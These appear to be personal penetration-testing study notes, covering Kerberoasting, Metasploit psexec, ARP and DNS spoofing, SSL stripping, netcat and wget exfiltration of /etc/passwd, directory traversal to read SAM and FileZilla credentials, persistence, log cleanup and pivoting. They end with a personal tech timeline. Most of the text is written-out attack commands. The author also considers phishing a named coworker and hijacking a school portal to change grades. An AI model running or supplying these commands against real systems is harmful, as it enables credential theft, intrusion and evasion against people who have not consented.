                        python GetUserSPNs.py active.htb/svc_tgs -dc -ip 10.10.10.100 -requrest 		
			NOTE: account = active.htb
			enter passwor:
			paste the password decrypted password from above
			take the hash and crack it
			using hashcat 
			hashcat --help
			look for tgs which is krb5 (kerberos 5) model 13100
			cmd windwos is faster >hackcat46 -e 13100 filenameOfHash rockyou.txt
			password at the end of hashdump
			
			msf> search psexec #choose the smb one
			use exploit/smb/psexec>
			options #to see what to add smbdomin = active.htb; admin is administrator; pass is what we cracket
			
			msf> set lhost target
		             set smbdomian active.htb
			     set smbuser administrator
			     set smbpass ghepasswordgot
			     set rhosts thetargetip
			     run
			     
			if it fails try a diff target
			msf> show targets
			msf>set target 2 #then 1, 3 etc
	                    run
	                meterpret>sysinfo
	                          getuid
	                	 load incognito
	                	 list_tokens -u
	                	 hashdump 
	                    
			
					MAN IN THE MIDDLE ATTACKS (MITM)
-----------------------------------------------------------------------------------------
	Since we are testing with LOCAL AREA NET lan in virutalbox, how do we relate it in real life
	1. i believe if we are on the same wifi is the same as above
	2. from my angle i can use wireshark to snif packet going thorough the network
	using suspecious as clue. eg a request to fb or sakai (i can see the dest and soruce ip) but i can't see the content sent.  (if im right). thats where mitm comes into play.
	3. but how will an attacker even get on a lan in the first place? (wifi gives me previlege) but what if its a lan. if the lan totally cut of the internet, then we have on lack. but since workers like amanu's pc are lan (becasue they share folders and apps with from a central server) and he uses it to browse, outside the intranet, means we can get into his system.
		1. when he gives me wifi
		2. when he goes to join a free wifi
		3. phising; sending him a link to her socail media which when he clicks will take him to another place to steal his social media pass and his network informatio(ip)
		4a. you got his social media pass: you can enter to see what he does 
		4b. you got his ip? you can scan to see if theres vulnerability on his machine when he comes online.
		
		in switched network; capturing all packet is difficult; but that is easy with hub. and so is in virual environment(you will be able to capture all traffic to all systems including the host (windows)). Turn of promiscous to simulate switch type env
	
					ARP CACHE POISONING
					===================
	since we are on the same network; we can see arp calls that are broadcast when any machine is looking for anyother. unfortunately after they established connection, it uses one directional connection so we cant see the details of the transaction between because it goes directly to it encrypted. so during broadcast, we reply we are the one, get it from the server and then forward it to the client. or we cause dos attack.
	root@kali:~# echo 1 > /proc/sys/net/ipv4/ip_forward #set it to forward
	root@kali:~# arpspoof -i eth0 -t target_ip/client ip_sever_target_connecting_to
	root@kali:~# arpspoof -i eth0 -t server_target_connecting_to target_ip
	
	arpspoof -i eth0 -t 192.168.88.134 192.168.88.2
	arpspoof -i eth0 -t 192.168.88.2 192.168.88.134
	
	whois sakai.com or ienabler #get the ipaddress of the domain.
	so now anyone gooing to those spot can be picked easily with a filter
	ip.dst=that_ip 
	same with all social media sites and credit card sites
	
	*********does it mean, during updates of sakai, i can use the destination ip of cloud server to know when someone is communiccating with it, arpspoof to get passwords for admin stuff like chaning my grade?
	
	question? does being on the same wifi network make one LOCAL?
	how about the fact that we can also access internet, so what is ou
r gateway
	

	Using ARP Cache Poisoning to Impersonate the Default Gateway (if anyone is browsing to the internet instead of using their networkgateway, let them use my gateway rather
	------------------------------------------------------------
	root@kali:~# arpspoof -i eth0 -t target_ip attacker_gateway_Ip
	root@kali:~# arpspoof -i eth0 -t attacker_gateway target_ip
	###forward all traffic request to the internet by our target through my gateway adn forward all traffic from internet to him
	*******can lead to dos if channel a whole network gateway through ur pc tobe right virutal machine

				DNS CACHE POISONONIG
			==================================
	nslookup sakai.com #dns does translation and bring back sakai ipaddress
	host file /windows32/drivers/etc/
	create ur own host file hosts.txt
	now: 	##make the users traffic to the internet come to us first
		###instead of giving it back what it requires from us from the internet,
		do the dns coversion and give him my machines ip:80 ie default page
		this leads to phising if we can clone the real site
		will help us get their password. i can simulate sakai, ienabler etc
		root@kali:~# arpspoof -i eth0 -t target_ip attacker_gateway_Ip
		root@kali:~# arpspoof -i eth0 -t attacker_gateway target_ip
		
	add your_ip and site for dns transl eg 192.168.88.128 facebook.com
		root@kali:~# dnsspoof -i eth0 -f hosts.txt
	
	traffic from attacker going to facebook.com will be forwarded to my machine and phising page. an alternate to social engineering where they send you a link generated to click
					SECURE SOCKET LAYER SSL ATTACK
					==============================
	for credit cards and authentication of right websites
	browsers ask sites to show their cert which it verifies before any secure connection is established
	if a browsers fails to verify the cert sent by a site it warns the user to stay away
	
	using ettercap (can do both arpspooofiing and dnspoofing)
	=========================================================
	a user going to facebook, is forced to use our gateway to make request; we channel the unsecure request to the server, that warns the user, but if they still want the click and get back what they want 
	whihc is facebook but unsecure, if they click yes and submit, we get back the credentials
	root@kali:~# ettercap -T eth0 -M arp:remote /192.168.20.1/ /192.168.20.11/ ####setting arp cache poisoning
				-T=text              use_attacker_gateway/ /target_vulner
	#will prompt the user that the site is insecure but if they continue, any login will be captured by wireshark
	
				SSL STRIPING
				============
	because users dont usually use https:// but use facebook, direct in browsers, we intercept their request through our and request the url and forward. sinc we sent an https, no certificat check will happen
	
	1. set up gateway spoofing first as above
	2. set ip tables root@kali:# iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
	 iptables -t nat -A OUTPUT -p tcp --destination-port 80 -j REDIRECT --to-port 1000
	
	3. root@kali:# sslstrip -l 8080

	
	
	
					FILE TRANSFERS
=================================================================================================
	WITH LINUX 
	wget linux
	powershell
	sftp
	USING NETCAT to cat file from a target machine back to us
        --------------------------
        nc -lvpn 1111 on attacker machine
        nc 192.168.88.128 1111 < filename
        
	LINUX
	=====
	wget #set a file server
	upload
	--------
	cd to a folder with the file to upload
	you might want to stop apachae 
	service apache2 stop
	python -m http.server 80
	then open browser and goto ip/?
	
	download
	----------
	wget ip/filename #will donload to the directory cw
	
	2. set a nc on the exploited machine and push out afile
	-------------------------
	nc -nvlp 8081 #on an exploited machine
	wget --post-files=/etc/passwd yourip yourport 
	
	
	WINDOWS
	========
	GOTO THE IP IN BROWSER 192.168.88.128/filename in GUI
	IN cmd
	use certutil
	certutil -urlcache -f ip/filename savefilename #to download
	
	
	note type === cat in cmd
	WEBDAV
	=========
	cadaver http://ip/webdav 
	default credential wampp:xampp
	dav:/webdav/> put file #file to upload to that server you have access to
		      help ##to see other options
		      
	FTP
	===
	#pip install pyftpdlib for setup or use xamp in windows to setup a ftp server
	python -m pyftpdlib -p 21v
	to login >ftp username@ip
	to see if its alive > nc ftp://ip or nc ip
	
	########when on host the vm can't pin the host; which is not case with NAT
	HENCE WHY I SWITCHED TO NAT when i had no sever on kali, win7 or ubuntu until a set one among the virtual machine
	windows
	-------
	>ftp 192.168.88.128/filename
	acount name: anonymous
	password:    anonymous
	
	ftp> dir
	ftp> get filename #dowmload
	cat filename to see whats going on
	in browser http://ip/filenamefound above opened?
		then it means we could uplaod (put) mal code and use it to get a shell
		if it fails but gives error page. that is part of finding
	ftp> put filename #upload
	
	TFTP (TRIVIAL FILE TRANSFER PROTOCOL FOR REMOTE SHAHING OF FILES)
	=================================================================
	first host just like in http= py -m http.sever 80
				ftp = py ftpdbl
				tftp = atftpd --daemon --bind-address our_ip /folder
		then wget or get the file using the shell or meterpreter
		>tftp our_target_ip_hostin_file get filename C:\\lcoation to save
		go on to open it in a browser or
		chmod +x then ./filenamae
		
	SENSITIVE FILES (hashes in windows configuration files) ZERVIT Open port
	===============================================================================
	http://target_ip:port/index.html?../../../../../../fileman.ini
	
	http://192.168.20.10:3232/index.html?../../../../../../xampp/FileZillaFtp/FileZilla%20Server.xml. //download filezilla configuration file user name and password
	
	windwos sam???
	in xp 
	http://192.168.20.10:3232/index.html?../../../../../../WINDOWS/system32/config/sam
	not found : check WINDOWS/repair/system and ....../repair/sam
	
	if you have physical access, use linux live to get the sam and system
	
	
	METASPLOIT
	==========
	WINDOWS EXPLOIT again
	mfs> use exploit/smb/psexec
	options
	set rhosts target_ip
	set smbdomin marvel
	st smbpass 
	set smbuser fcastle
	run 
	set target 2
	meterpereter > help
	meter> pwd
	meter> cd c:\\users
	dir
	meter> upload filename c:\\where to put it
	meter> download C:\\filenname  rename
	
	
					MAINTAINING ACCESS
					==================
	YOU TAKE CONTROL
	persistence
	--------------
	meter>run persistence -h #for opotions on what you want to set by default
	#this is dangerous
	example
	exploit /windows/local/persistence #allows malware upload
	exploit /windows/local/registry_persistence
	###you have to delete or you expose a port open
	
	the attack to gain powershell was used using persistence
	>backgroud takes u back to the msf
	msf> use windows/multi/handler
	set payload windows/meterper/reverse_tcp
	set lhost 433 #on a popular port
	set lport your ip 
	make sure to close registry
	
	Scheduled tasds
	------------
	meter>run scheduleme
	
	
	metsvc
	-----------
	
					CLEANUP
					=======
	remove all executalte scrips, temp files, use secure delete when removing them
	return to default parameters of register etc if they were modified
	remove backdoors or rootkits installed
	remove usr accounts created on for loggin in on the compromise system
	in hacking?
	system logs
	your trace 
	anything that can lead to you
	
					
					
					PIVOTING
					========
	goto workstattion >edit> virtual network editor > add network with host and ip 10.`10.10.2
	kali service networking restart #restart the network
	
	msf> use exploit/windos/smb/psexec
	options
	set lhost and port
	run
	meter> run -autoroute -p #no route has been added
	run autoroute -s 10.10.10.0/24
	meter> run -autoroute -p #it will be added
	meter>shell
		route print #print route
		arp -a
		netstate -ano
		crt + c back to meterperter
	meter> background to ms
	use auxiliary/scanner/portscan/tcp
	set rhost 10.10.10.129_the_target
	set port 139
	use exploit/windoes/psexect #if you got hash
	options
	set rhosts target_ip
	set lport your_port
	set smbusr Admininstrator
	set smbpass password
	run
	
		
	
	
	
	
	
	
	
	
	
			
			
		when there's no exploitation
		


#i have been flashing phones
first phone flashed at thomasi place: k800
rooting my symbian phones 2012
started flashing nokia asha phones, samsung, mtk spd confirm in file
2013 laptop hp mini recovered windows logout pass using ubuntu live cd 13 lte
2014 jail break isaacs iphone 3
2014 brazil worldcupt: removed wakye moms sun at base at nigh onscreenlock
then flashed his sony xperia u 
2022 school powershell vulnerability 
phones
=====
3350 mom
1100 boza
nokia 6070 humu adashie 2009/2010
sony erikson k310 
k700 sony ericson
k800
nokia symbian n82 aguero
nokia n5800 isaac kumasi went back 1300 tall screentoch
galaxy note 3 2017
lg g6 2020


development
============
2020 had cert with coursera html and built something that i still have
learning python 2014
learning java 2021 after july when i left home bc of hamdallah and was cheated by qurbs
sept 2021 react native at school
dec did flutter with couple of apps
2022 june vac tried react with mongo and express backend one month vac
2022 sep vac doing pentesting


my practuc
==========
i first did nmap scan without -A to get open ports
then i did with -A to get information about underlying feature
i also tried dirb to see folders i couldn't see with just the ip alone

i search a info about a port in searchsploit
i got a name that it exist
took the name and search in metaspoilt
selected it and look at the info 
